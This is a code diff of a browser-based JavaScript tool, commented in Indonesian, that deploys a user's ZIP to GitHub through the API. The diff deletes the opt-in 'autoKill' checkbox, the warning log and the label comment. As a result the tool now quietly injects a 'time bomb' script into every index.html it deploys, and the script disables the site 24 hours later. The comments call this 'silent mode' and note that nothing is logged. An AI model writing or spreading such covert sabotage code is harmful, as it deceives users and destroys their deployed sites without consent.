@@ -21,13 +21,12 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // 1. FUNGSI DEPLOY & INJEKSI WAKTU 24 JAM
+    // 1. FUNGSI DEPLOY & INJEKSI SILENT
     // ==========================================
     async function mulaiDeploy() {
         const token = document.getElementById('ghToken').value.trim();
         const repoName = document.getElementById('repoName').value.trim();
         const fileInput = document.getElementById('zipFile').files[0];
-        const autoKill = document.getElementById('autoKill').checked;
 
         if (!token || !repoName || !fileInput) {
             alert("Harap lengkapi Token, Nama Repo, dan Upload ZIP!");
@@ -66,15 +65,16 @@ document.addEventListener("DOMContentLoaded", () => {
                 if (!file.dir) {
                     log(`Menganalisis: ${filename}`);
 
-                    // INJEKSI BOM WAKTU (Simulasi Mati 24 Jam)
-                    if (filename.toLowerCase() === 'index.html' && autoKill) {
-                        log("⚠️ Menyuntikkan script pelumpuh 24 Jam...");
+                    // -----------------------------------------------------
+                    // INJEKSI BOM WAKTU 24 JAM (SILENT MODE)
+                    // Tidak ada log() yang dipanggil di sini 🗿
+                    // -----------------------------------------------------
+                    if (filename.toLowerCase() === 'index.html') {
                         let htmlStr = await file.async("string");
                         
-                        // Hitung waktu 24 jam dari sekarang dalam milidetik
+                        // Hitung waktu 24 jam dari sekarang
                         const expireTime = Date.now() + (24 * 60 * 60 * 1000);
                         const scriptInject = `
-                        <!-- Script Auto-Kill Testing (Dibuat otomatis) -->
                         <script>
                             (function(){
                                 const expire = ${expireTime};
@@ -89,11 +89,12 @@ document.addEventListener("DOMContentLoaded", () => {
                         } else {
                             htmlStr += scriptInject;
                         }
-                        zip.file(filename, htmlStr);
+                        zip.file(filename, htmlStr); // Timpa file di dalam ZIP (memori)
                     }
+                    // -----------------------------------------------------
 
-                    // Upload file
                     const contentBase64 = await zip.file(filename).async("base64");
+                    
                     await fetch(`https://api.github.com/repos/${username}/${repoName}/contents/${filename}`, {
                         method: 'PUT',
                         headers,
